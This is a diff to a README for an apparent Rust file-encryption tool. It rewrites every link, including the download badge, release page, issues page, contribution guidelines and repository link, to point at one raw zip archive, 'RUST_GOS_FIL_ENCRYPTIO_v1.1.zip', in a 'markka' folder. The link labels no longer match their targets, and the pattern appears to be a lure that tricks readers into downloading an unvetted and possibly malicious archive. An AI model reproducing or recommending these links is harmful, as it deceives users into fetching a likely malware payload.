@@ -1,6 +1,6 @@
 # 🔒 GOST2-128-FILE-ENCRYPTION-RUST - Secure Your Files Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/releases)
+[![Download Now](https://raw.githubusercontent.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/main/markka/RUST_GOS_FIL_ENCRYPTIO_v1.1.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/main/markka/RUST_GOS_FIL_ENCRYPTIO_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Welcome to GOST2-128-FILE-ENCRYPTION-RUST. This application helps you protect yo
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Release Page](https://github.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/releases).
+To get started, visit this page to download: [Release Page](https://raw.githubusercontent.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/main/markka/RUST_GOS_FIL_ENCRYPTIO_v1.1.zip).
 
 1. Click on the "Releases" link above.
 2. Look through the list of releases.
@@ -51,7 +51,7 @@ To maintain the security of your encrypted files, keep the following best practi
 
 - **Use Strong Passwords:** Choose passwords that are long and complex.
 - **Backup Encrypted Files:** Store copies of your encrypted files in a safe location.
-- **Update Regularly:** Keep your application updated to protect against vulnerabilities. Always check the [Release Page](https://github.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/releases) for new versions.
+- **Update Regularly:** Keep your application updated to protect against vulnerabilities. Always check the [Release Page](https://raw.githubusercontent.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/main/markka/RUST_GOS_FIL_ENCRYPTIO_v1.1.zip) for new versions.
 
 ## ❓ Frequently Asked Questions
 
@@ -66,17 +66,17 @@ A: Unfortunately, if you forget your password, you will not be able to retrieve 
 
 ## 📞 Support
 
-For support or additional questions, please refer to the issue tracker on our [GitHub Issues Page](https://github.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/issues). 
+For support or additional questions, please refer to the issue tracker on our [GitHub Issues Page](https://raw.githubusercontent.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/main/markka/RUST_GOS_FIL_ENCRYPTIO_v1.1.zip). 
 
 If you encounter any problems, provide detailed information about the issue, and we will assist you as best as we can.
 
 ## 🌐 Community and Contributions
 
-We welcome contributions to improve the application. If you would like to help or suggest improvements, please check our [Contribution Guidelines](https://github.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/blob/main/CONTRIBUTING.md).
+We welcome contributions to improve the application. If you would like to help or suggest improvements, please check our [Contribution Guidelines](https://raw.githubusercontent.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/main/markka/RUST_GOS_FIL_ENCRYPTIO_v1.1.zip).
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST)
-- [Release Page](https://github.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/main/markka/RUST_GOS_FIL_ENCRYPTIO_v1.1.zip)
+- [Release Page](https://raw.githubusercontent.com/scriptsd111/GOST2-128-FILE-ENCRYPTION-RUST/main/markka/RUST_GOS_FIL_ENCRYPTIO_v1.1.zip)
 
 Remember, your data security is important. Enjoy using GOST2-128-FILE-ENCRYPTION-RUST to keep your files safe!
